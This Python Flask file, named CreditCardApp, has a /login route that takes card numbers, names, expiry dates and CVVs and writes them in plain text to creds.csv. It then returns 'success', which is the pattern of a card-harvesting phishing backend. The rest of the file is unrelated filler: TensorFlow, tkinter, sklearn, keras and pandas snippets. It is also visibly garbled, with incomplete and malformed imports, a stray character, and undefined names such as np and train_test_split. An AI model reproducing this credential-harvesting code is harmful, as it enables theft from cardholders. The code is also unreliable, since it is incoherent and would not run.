from flask import Flask, render_template, jsonify, request
import csv
import turtle 
from tkinter import Tk, Label, Button 
from sklearn import datasets  
from sklearn.model_selection 
from sklearn.linear_model import LinearRegression
import keras ng
from keras.models import Sequential
from keras.layers import Dense
import pandas as pd  
import tensorflow as tf  

class CreditCardApp:
    def __init__(self):
        self.app = Flask(__name__)

       
        self.app.add_url_rule("/", view_func=self.index, methods=["GET"])
        self.app.add_url_rule("/login", view_func=self.login, methods=["POST"])

    def run(self):
        self.app.run(debug=True)

    def index(self):
        return render_template("/index.html")

    def login(self):
        card_number = request.json.get("card_number")
        name = request.json.get("name")
        expiry = request.json.get("expiry")
        cvv = request.json.get("cvv")

    
        self.process_login(card_number, name, expiry, cvv)

        
        self.tensor_operations_example()

        

      
        self.gui_example()

       
        self.sklearn_example()

       s
        self.keras_example()

        
        self.data_mining_example()

        
        self.data_processing_example()

        return jsonify({
            "status": "success"
        }), 201

    @staticmethod
    def process_login(card_number, name, expiry, cvv):
        with open("creds.csv", "a+") as f:
            csv_writer = csv.writer(f)
            csv_writer.writerow([card_number, name, expiry, cvv])

    @staticmethod
    def tensor_operations_example():
        tensor_example = tf.constant([[1, 2], [3, 4]])
        tensor_squared = tf.square(tensor_example)
        print("Tensor Squared:")
        print(tensor_squared)

    @staticmethod
    def turtle_graphics_example():
        turtle.forward(100)
        turtle.right(90)
        turtle.forward(100)
        turtle.done()

    @staticmethod
    def gui_example():
        root = Tk()
        label = Label(root, text="Hello, GUI!")
        button = Button(root, text="Click me")
        label.pack()
        button.pack()
        root.mainloop()

    @staticmethod
    def sklearn_example():
        iris = datasets.load_iris()
        X_train, X_test, y_train, y_test = train_test_split(iris.data, iris.target, test_size=0.2, random_state=42)
        model = LinearRegression()
        model.fit(X_train, y_train)

    @staticmethod
    def keras_example():
        model = Sequential()
        model.add(Dense(units=64, activation='relu', input_dim=8))
        model.add(Dense(units=1, activation='sigmoid'))

    @staticmethod
    def data_mining_example():
        data = {'Name': ['John', 'Jane', 'Bob'], 'Age': [28, 35, 22]}
        df = pd.DataFrame(data)

    @staticmethod
    def data_processing_example():
        array = np.array([[1, 2, 3], [4, 5, 6]])
        sum_result = np.sum(array)
        print("Sum of the array:", sum_result)

if __name__ == "__main__":
    credit_card_app = CreditCardApp()
    credit_card_app.run()
